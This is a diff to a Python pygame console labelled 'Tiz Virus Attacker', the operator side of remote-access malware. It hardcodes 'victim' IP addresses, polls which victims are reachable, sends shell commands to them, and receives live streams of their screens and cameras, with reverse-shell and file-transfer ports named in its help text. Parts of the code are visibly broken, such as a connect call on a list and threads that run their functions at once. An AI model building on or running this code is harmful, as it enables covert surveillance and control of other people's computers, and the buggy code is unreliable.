@@ -32,18 +32,17 @@ font = pygame.font.Font(None, 36)
 # arguments parser
 def parseargs():
     cli_args = argparse.ArgumentParser(description="Tiz Virus Attacker")
-    cli_args.add_argument('--host', help="connecting ip, default is localhost'", default='192.168.1.3', type=str)
-    cli_args.add_argument('--port', help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2, file transfer = port+3", default=5000, type=int)
-    cli_args.add_argument('--shell', help="shell=t revershell on port (default = 5000) / shell=f don't revershell", default="t", type=str)
-    cli_args.add_argument('--camera', help="camera=t stream camera on port+1 (default = 5001) / camera=f don't stream",default="t", type=str)
-    cli_args.add_argument('--screen', help="screen=t stream screen on port+2 (default = 5002) / screen=f don't stream",default="t", type=str)
+    cli_args.add_argument('--port', help="default port is 5000, revershell = port, camera stream = port+1, screen stream = port+2", default=5000, type=int)
     options = cli_args.parse_args(sys.argv[1:])
+  
+    options.hosts = VICTIM_IPS
     return options
 
 class Display:
     def __init__(self, x, y, width, height, text):
         self.rect = pygame.Rect(x, y, width, height)
         self.text = text
+        self.status = "Not reachable"
 
     def draw(self, surface, offset_y):
         adjusted_rect = self.rect.copy()
@@ -54,6 +53,9 @@ class Display:
             text_surface = font.render(self.text, True, BLACK)
             text_rect = text_surface.get_rect(center=adjusted_rect.center)
             surface.blit(text_surface, text_rect)
+    
+    def update_status(self, status):
+        self.status = status
 
 class Button:
     def __init__(self, x, y, width, height, text, color):
@@ -61,11 +63,12 @@ class Button:
         self.text = text
         self.color = color
 
-    def draw(self, surface):
-        pygame.draw.rect(surface, self.color, self.rect)
-        pygame.draw.rect(surface, DARK_GRAY, self.rect, 2)
+    def draw(self, surface, offset_y = 0):  
+        adjusted_rect = self.rect.move(0, offset_y)
+        pygame.draw.rect(surface, self.color, adjusted_rect)
+        pygame.draw.rect(surface, DARK_GRAY, adjusted_rect, 2)
         text_surface = font.render(self.text, True, BLACK)
-        text_rect = text_surface.get_rect(center=self.rect.center)
+        text_rect = text_surface.get_rect(center=adjusted_rect.center)
         surface.blit(text_surface, text_rect)
 
 import textwrap
@@ -76,7 +79,7 @@ class InputBox:
         self.text = ''
         self.prompt = 'Enter command: '
         self.active = False
-        self.font = pygame.font.Font(None, 20)  # Sử dụng font Arial hỗ trợ Unicode
+        self.font = pygame.font.Font(None, 20)  
         self.history = []  # Lưu lịch sử lệnh và kết quả
         self.scroll_offset = 0  # Vị trí cuộn hiện tại
         self.cursor_visible = True  # Con trỏ chuột
@@ -104,7 +107,6 @@ class InputBox:
 
                 # Kiểm tra cuộn
                 if total_lines > visible_lines:
-                    # Cập nhật scroll_offset để luôn cuộn đúng
                     self.scroll_offset = (total_lines - visible_lines) * 20
                 else:
                     self.scroll_offset = 0
@@ -114,7 +116,6 @@ class InputBox:
             else:
                 self.text += event.unicode
 
-        # Điều khiển cuộn chuột
         if event.type == pygame.MOUSEBUTTONDOWN and event.button in (4, 5):
             if event.button == 4:  # Cuộn lên
                 self.scroll_offset = max(0, self.scroll_offset - 20)
@@ -137,7 +138,6 @@ class InputBox:
                 surface.blit(txt_surface, (self.rect.x + 5, y_offset))
                 y_offset += txt_surface.get_height()
 
-        # Vẽ ký tự "$" trước dòng lệnh
         dollar_surface = self.font.render('$ ', True, WHITE)
         surface.blit(dollar_surface, (self.rect.x + 5, y_offset))
 
@@ -159,7 +159,7 @@ class InputBox:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             BUFFER_SIZE = 1024
-            s.connect((options.host, options.port))
+            s.connect((displays.text, options.port))
             
             s.send(command.encode())
             if command.lower() == "exit":
@@ -171,11 +171,45 @@ class InputBox:
         except Exception as e:
             return f"Error when sending command: {e}"
 
+# vector victim origin
+VICTIM_IPS = ['10.10.27.191','10.10.27.239', '10.0.2.15']
+
+# check victim status 
+def check_victim_status(hosts, port):
+    victims_status = {}
+    for host in hosts:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)  # Set timeout to 1 second
+            s.connect((host, port))
+            victims_status[host] = "Reachable"
+            s.close()
+        except socket.error:
+            victims_status[host] = "Not reachable"
+    return victims_status
+
+def choose_victim(victims_status):
+    print("Victim Status:")
+    for i, (host, status) in enumerate(victims_status.items(), 1):
+        print(f"{i}. {host} - {status}")
+    
+    while True:
+        choice = input(f"Choose victim to connect (1-{len(victims_status)}): ")
+        if choice.isdigit() and 1 <= int(choice) <= len(victims_status):
+            selected_host = list(victims_status.keys())[int(choice) - 1]
+            # Kiểm tra trạng thái là "Reachable"
+            if victims_status[selected_host] == "Reachable":
+                return selected_host
+            else:
+                print(f"Victim {selected_host} is not reachable.")
+        else:
+            print("Invalid choice, try again.")
+
 # Create initial displays
 displays = [
-    Display(50, 50, 200, 150, "Display 1"),
-    Display(300, 50, 200, 150, "Display 2"),
-    Display(550, 50, 200, 150, "Display 3"),
+    Display(50, 50, 200, 150, VICTIM_IPS[0]),
+    Display(300, 50, 200, 150, VICTIM_IPS[1]),
+    Display(550, 50, 200, 150, VICTIM_IPS[2]),
 ]
 
 # Create "+" button
@@ -231,7 +265,7 @@ def recvall(sock, length, buffer_size=8192):
     return buf
 
 
-def screenreceiver(host='192.168.1.3', port=5001):
+def screenreceiver(host, port=5001):
     global screen_running
     screen_running = True
     with socket.socket() as sock:
@@ -271,7 +305,7 @@ def screenreceiver(host='192.168.1.3', port=5001):
                 print(f"Error receiving/displaying image: {e}")
                 break
 
-def camreceiver(host='192.168.1.3', port=5002):
+def camreceiver(host, port=5002):
     global camera_running
     s = socket.socket()
     s.connect((host, port))
@@ -351,7 +385,7 @@ def show_full_screen(display):
             if event.type == pygame.QUIT:
                 pygame.quit()
                 sys.exit()
-            input_box.handle_event(event)  # Xử lý sự kiện cho vùng input
+            input_box.handle_event(event)  
 
             if event.type == pygame.MOUSEBUTTONDOWN:
                 if event.button == 1:
@@ -359,7 +393,7 @@ def show_full_screen(display):
                         full_screen = False
                     elif camera_button.rect.collidepoint(event.pos):
                         if not camera_running:
-                            camera_thread = threading.Thread(target=camreceiver)
+                            camera_thread = threading.Thread(target=camreceiver(host=display.text))
                             camera_thread.start()
                             camera_button.text = "Stop Camera"
                         else:
@@ -367,7 +401,7 @@ def show_full_screen(display):
                             camera_button.text = "Start Camera"
                     elif screen_button.rect.collidepoint(event.pos):
                         if not screen_running:
-                            screen_thread = threading.Thread(target=screenreceiver)
+                            screen_thread = threading.Thread(target=screenreceiver(host=display.text))
                             screen_thread.start()
                             screen_button.text = "Stop Screen"
                         else:
@@ -383,9 +417,9 @@ def show_full_screen(display):
         text_rect = text_surface.get_rect(center=(WIDTH // 2, HEIGHT // 4))
         screen.blit(text_surface, text_rect)
               
-        camera_button.draw(screen)
-        screen_button.draw(screen)
-        file_button.draw(screen)
+        camera_button.draw(screen,0)
+        screen_button.draw(screen,0)
+        file_button.draw(screen,0)
         back_button.draw(screen, 0)
         
         pygame.display.flip()
@@ -403,6 +437,7 @@ def main():
     max_scroll_y = 0
 
     while True:
+        
         for event in pygame.event.get():
             if event.type == pygame.QUIT:
                 pygame.quit()
@@ -427,6 +462,17 @@ def main():
             display.draw(screen, scroll_y)
 
         add_button.draw(screen, 0)
+
+        victims_status = check_victim_status(options.hosts, options.port)
+        # xử lí hiện tích xanh trên giao diện display nếu trạng thái có thể kết nối và tích đỏ nếu máy ảo ko hd
+        for i in range(len(victims_status)):  
+            if victims_status[VICTIM_IPS[i]] == "Reachable":
+                onl_button = Button((i % 3) * 250 + 50, (i // 3) * 250 + 50, 20, 20, "", GREEN)
+                onl_button.draw(screen,scroll_y)
+            elif victims_status[VICTIM_IPS[i]] == "Not reachable":
+                onl_button = Button((i % 3) * 250 + 50, (i // 3) * 250 + 50, 20, 20, "", RED)
+                onl_button.draw(screen,scroll_y)
+
 
         pygame.display.flip()
         clock.tick(60)
